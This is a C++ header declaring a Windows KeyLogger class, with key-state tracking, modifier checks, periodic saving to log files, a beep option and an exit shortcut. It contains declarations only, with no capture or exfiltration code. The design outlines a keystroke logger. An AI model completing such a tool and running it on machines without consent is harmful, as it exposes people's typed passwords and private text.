#pragma once
#include <Windows.h>
#include "keymapper.h"
#include "timer.h"
#include "clarg.h"

class KeyLogger
{
	class Parameters
	{
	public:
		bool beep_;
		bool rawLog_;
		double processPeriod_;
		double savePeriod_;
		std::string logFilename_;
		std::string rawLogFilename_;

		//void process_param_(std::string const& param);
		//void process_str_(std::string parameters);
		Parameters();
		friend class KeyLogger;
	};

	KeyMapper keyMapper_;
	x::timer<> processTimer_;
	x::timer<> saveTimer_;
	std::fstream logFile_;
	std::fstream rawLogFile_;
	bool keyState[256];

	bool exit_shortcut_();
	void save_();
	bool shift_();
	bool ctrl_();
	bool alt_();
	bool is_mod_(size_t ch);
	bool is_graphic_(size_t ch);
	void clear_log_();
	void process_key_(size_t key);

public:
	ArgHandler argHandler_;
	Parameters parameters_;

	KeyLogger();
	void process();

	~KeyLogger();
};

